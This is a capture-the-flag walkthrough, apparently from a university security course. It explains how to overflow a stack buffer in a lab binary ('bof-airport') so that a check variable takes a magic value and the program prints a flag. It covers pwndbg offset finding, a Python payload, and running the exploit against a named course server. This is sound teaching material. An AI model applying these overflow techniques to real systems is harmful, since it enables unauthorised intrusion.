# Buffer Overflow - Airport Challenge Walkthrough

## Goal
Overflow a stack buffer to change a check variable from its initial value to a target value, triggering the flag output.

## Key Difference from ret2win
Unlike `stacksmashing`, this challenge **does NOT return to a function**. Instead:
- It checks if a local variable equals a target value
- If the check passes, it prints the flag
- The variable is on the stack adjacent to the buffer

## Step 1: Identify the Check Variable (GDB/pwndbg)

### Disassemble main
```
pwndbg> disassemble main
```

Look for:
- `lea    eax,[ebp-0x26]` → buffer location (input buffer)
- `cmp    dword ptr [ebp-0x8], 0xcacacaca` → check variable location

### Extract the Offset

From the assembly:
```
Buffer:      [ebp-0x26]
Check var:   [ebp-0x8]
Offset = 0x26 - 0x8 = 0x1E = 30 bytes (decimal)
```

**The offset is the distance from buffer start to the check variable.**

## Step 2: Verify with Cyclic Pattern (pwndbg)

### Generate pattern
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

### Set breakpoint after gets
```
pwndbg> b *0x08049264
Breakpoint 1 at 0x8049264
pwndbg> run
```

### Send the cyclic pattern
When prompted for input, paste the cyclic pattern.

### Check the stack
Look at the STACK section in pwndbg output. Find where the check variable gets corrupted:
```
07:001c│-008 0xffffd288 {airport} ◂— 'gaaahaaaiaaajaaakaaalaaama'
```

The `{airport}` label shows the check variable location. Count back from buffer start to this position.

**Alternatively:** Look at what value corrupts the variable and use `cyclic -l` to find the offset:
```
pwndbg> cyclic -l 0x61616167
Found at offset 30
```

## Step 3: Determine the Magic Value

From the assembly check:
```
cmp    dword ptr [ebp-0x8], 0xcacacaca
```

The magic value is `0xcacacaca`. To pass the check and trigger the flag, you must write this exact value to the check variable.

**Note:** Different binaries may have different magic values:
- `bof-water`: `0x18181818`
- `bof-water18`: `0x19191919`
- `bof-airport`: `0xcacacaca`

Always read the `cmp` instruction to find the correct magic value.

## Step 4: Build the Payload

```python
OFFSET = 30  # bytes to reach check variable
TARGET_ADDR = 0xcacacaca  # magic value (little-endian)

payload = b"A" * OFFSET + struct.pack("<I", TARGET_ADDR) + b"\n"
```

Little-endian representation of `0xcacacaca`:
```
0xca 0xca 0xca 0xca  (bytes)
\xca\xca\xca\xca      (Python)
struct.pack("<I", 0xcacacaca)  (using struct)
```

## Step 5: Test Locally (Critical!)

Before running on the remote server, test locally:

```python
LOCAL_BINARY = "./bof-airport"  # Set to local binary path
# Run:
# python3 exploit.py
```

If you get the flag output locally, the offset and target are correct. **Do not move to remote until local test passes.**

## Step 6: Run on Remote

Once verified locally:

```python
LOCAL_BINARY = ""  # Empty string uses remote
HOST = "moa6.eecs.utk.edu"
PORT = 3009
```

Run:
```bash
python3 exploit.py
```

Expected output:
```
You are flying to Califonia!. Here is the flag ticket. Safe Trip!
cosc466-flag-{...}
```

## How Offset Changes Between Versions

The offset depends on:
1. **Buffer size** - the `char airport[N]` declaration size
2. **Variable position** - where the check variable is stored relative to the buffer
3. **Compiler optimizations** - different GCC versions may reorder stack variables
4. **Architecture** - x86 vs x86_64 (this challenge is 32-bit)

### Example variations:
- If buffer expands from 30 to 40 bytes → offset increases by 10
- If variable moves from `[ebp-0x8]` to `[ebp-0x10]` → offset changes
- If extra local variables are added → offset shifts

### Always verify with new binary:
```bash
# Calculate offset from assembly
disassemble main  # Look at lea and cmp
# Or use cyclic pattern to confirm
cyclic 100 && run  # Verify at breakpoint
cyclic -l <corrupted_value>  # Find exact offset
```

## Testing Different Offsets

If your initial offset doesn't work:

1. **Try ±2 bytes** (common in 32-bit due to alignment):
   - OFFSET = 28, 29, 30, 31, 32

2. **Recalculate from assembly:**
   ```
   lea eax,[ebp-0x?????]   ← buffer offset
   cmp dword ptr [ebp-0x?] ← variable offset
   New offset = buffer_offset - variable_offset
   ```

3. **Use cyclic to verify:**
   ```
   pwndbg> cyclic -l <value_at_variable>
   Found at offset X
   ```

4. **Test locally after each change:**
   ```
   OFFSET = X
   python3 exploit.py  # Local test
   ```

## Summary

| Step | Action |
|------|--------|
| 1 | Disassemble main, find buffer and check variable |
| 2 | Calculate offset: `buffer_addr - variable_addr` |
| 3 | Use cyclic pattern to verify offset (pwndbg) |
| 4 | Find magic value from `cmp` instruction |
| 5 | Build payload: padding + magic value (little-endian) |
| 6 | **Test locally first** |
| 7 | Run on remote once local test passes |

## Common Mistakes

❌ **Wrong offset** → Check variable doesn't change → no flag
❌ **Wrong magic value** → Check passes but variable check is for a different value
❌ **Not testing locally** → Wasting time on remote with wrong parameters
❌ **Forgetting little-endian** → Bytes in wrong order
❌ **Not handling multi-packet responses** → Missing flag output on remote

## Commands Reference

```bash
# Local test
gdb ./bof-airport
(gdb) disassemble main
(gdb) b *0x08049264
(gdb) cyclic 100
(gdb) run
(gdb) cyclic -l <address>
(gdb) quit

# Remote exploit
python3 exploit.py
```
